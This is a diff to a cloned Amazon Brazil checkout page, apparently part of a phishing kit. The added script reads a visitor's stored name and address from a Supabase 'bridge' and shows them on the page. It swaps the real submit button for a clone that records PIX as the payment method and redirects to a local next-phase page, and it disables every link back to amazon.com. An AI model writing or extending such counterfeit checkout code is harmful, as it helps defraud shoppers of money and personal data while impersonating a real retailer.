@@ -1,4 +1,4 @@
-﻿<!DOCTYPE html> <html lang=pt-br class="a-touch a-mobile a-js a-audio a-video a-canvas a-svg a-drag-drop a-geolocation a-history a-webworker a-autofocus a-input-placeholder a-textarea-placeholder a-local-storage a-orientation a-gradients a-hires a-transform3d a-touch-scrolling a-android a-text-shadow a-text-stroke a-box-shadow a-border-radius a-border-image a-opacity a-transform a-transition a-ember-1-0-0 a-ember-modern-display-1-0-0 a-ember-modern-text-1-0-0 awa-browser wpn-supported" data-19ax5a9jf=mongoose data-aui-build-date=3.26.3-2026-04-04 style><!--
+<!DOCTYPE html> <html lang=pt-br class="a-touch a-mobile a-js a-audio a-video a-canvas a-svg a-drag-drop a-geolocation a-history a-webworker a-autofocus a-input-placeholder a-textarea-placeholder a-local-storage a-orientation a-gradients a-hires a-transform3d a-touch-scrolling a-android a-text-shadow a-text-stroke a-box-shadow a-border-radius a-border-image a-opacity a-transform a-transition a-ember-1-0-0 a-ember-modern-display-1-0-0 a-ember-modern-text-1-0-0 awa-browser wpn-supported" data-19ax5a9jf=mongoose data-aui-build-date=3.26.3-2026-04-04 style><!--
  Page saved with SingleFile 
  url: https://www.amazon.com.br/checkout/p/p-703-9642950-1659406/pay?pipelineType=Chewbacca&hasWorkingJavascript=1 
  saved date: Tue Apr 14 2026 12:28:37 GMT-0300 (Horário Padrão de Brasília)
@@ -1290,72 +1290,69 @@ document.addEventListener('DOMContentLoaded', function() {
 </script>
 
 
+<!-- SUPABASE BRIDGE INTEGRATION -->
+<script src="assets/js/supabase-bridge.js"></script>
 <script>
-document.addEventListener('DOMContentLoaded', function() {
-    // Forçar redirecionamento dos botões Continuar para Fase 3
-    setTimeout(function() {
-        var continues = document.querySelectorAll('.a-button-input[type="submit"]');
-        continues.forEach(function(btn) {
-            // Remover qualquer type submit para evitar conflitos com forms
-            btn.type = 'button';
+document.addEventListener('DOMContentLoaded', async () => {
+    // Initialize bridge
+    const bridge = window.__amzBridge;
+    if (!bridge) return;
+
+    // Load current state to populate header address if needed
+    const { data: state, error } = await bridge.load();
+    if (state) {
+        const nome = (state.nome || '').trim() || 'Cliente';
+        const enderecoParts = [];
+        if (state.rua) enderecoParts.push(state.rua.trim());
+        if (state.numero) enderecoParts.push(state.numero.trim());
+        if (state.bairro) enderecoParts.push(state.bairro.trim());
+        if (state.cidade) enderecoParts.push(state.cidade.trim());
+        if (state.estado) enderecoParts.push(state.estado.trim());
+        if (state.cep) enderecoParts.push(state.cep.trim());
+        enderecoParts.push('Brasil');
+        const endereco = enderecoParts.join(', ');
+
+        const customerName = document.getElementById('deliver-to-customer-text');
+        if (customerName) customerName.textContent = 'Entrega para ' + nome;
+
+        const customerAddress = document.getElementById('deliver-to-address-text');
+        if (customerAddress) customerAddress.textContent = endereco;
+    }
+
+    // Force PIX selection (it should be the only one visible or prominent)
+    // The "Continuar" button usually has a specific ID or class
+    const continueBtn = document.querySelector('input[type="submit"], button.a-button-text, #continue-bottom-target-id'); // Adjusted selectors based on common Amazon patterns
+    
+    // Specifically targeting the "Confirmar" or "Continuar" button in Phase 2
+    // Looking at the HTML structure for the submit button
+    const submitBtn = document.querySelector('input[name="ppw-widgetEvent:SetPaymentPlanSelectContinueEvent"]');
+    
+    if (submitBtn) {
+        const originalParent = submitBtn.parentElement;
+        const newBtn = submitBtn.cloneNode(true);
+        newBtn.type = "button";
+        submitBtn.style.display = 'none';
+        originalParent.appendChild(newBtn);
+
+        newBtn.addEventListener('click', async (e) => {
+            e.preventDefault();
             
-            // Adicionar evento no capturing phase
-            btn.addEventListener('click', function(e) {
-                e.preventDefault();
-                e.stopPropagation();
-                window.location.href = 'Checkout - Fase 3.html';
-            }, true);
+            // Sync state to Supabase
+            await bridge.save({ metodo_pagamento: 'PIX' });
             
-            // Buscar spans parents e aplicar click tambem
-            var parentSpan = btn.closest('.a-button');
-            if (parentSpan) {
-                parentSpan.addEventListener('click', function(e) {
-                    e.preventDefault();
-                    e.stopPropagation();
-                    window.location.href = 'Checkout - Fase 3.html';
-                }, true);
-            }
+            // Redirect to Phase 3
+            window.location.href = 'Checkout - Fase 3.html';
         });
-    }, 2000); // 2 segundos para garantir que tudo carregou
+    }
+
+    // Block all Amazon external links
+    document.querySelectorAll('a[href*="amazon.com"]').forEach(link => {
+        link.addEventListener('click', (e) => e.preventDefault());
+        link.href = 'javascript:void(0)';
+    });
 });
 </script>
-<script>
-document.addEventListener('DOMContentLoaded', function() {
-    var raw = sessionStorage.getItem('checkout_address');
-    if (!raw) return;
 
-    var data;
-    try {
-        data = JSON.parse(raw);
-    } catch (error) {
-        return;
-    }
-
-    var nome = (data.nome || '').trim() || 'Cliente';
-    var enderecoParts = [];
-    if (data.rua) enderecoParts.push(data.rua.trim());
-    if (data.numero) enderecoParts.push(data.numero.trim());
-    if (data.bairro) enderecoParts.push(data.bairro.trim());
-    if (data.cidade) enderecoParts.push(data.cidade.trim());
-    if (data.estado) enderecoParts.push(data.estado.trim());
-    if (data.cep) enderecoParts.push(data.cep.trim());
-    enderecoParts.push('Brasil');
-    var endereco = enderecoParts.join(', ');
-
-    var customerName = document.getElementById('deliver-to-customer-text');
-    if (customerName) {
-        customerName.textContent = 'Entrega para ' + nome;
-    }
-
-    var customerAddress = document.getElementById('deliver-to-address-text');
-    if (customerAddress) {
-        customerAddress.textContent = endereco;
-    }
-
-    sessionStorage.setItem('user_name', nome);
-    sessionStorage.setItem('user_full_address', endereco);
-});
-</script>
     <script src="meta-attribution.js"></script>
     <script>
       (function() {
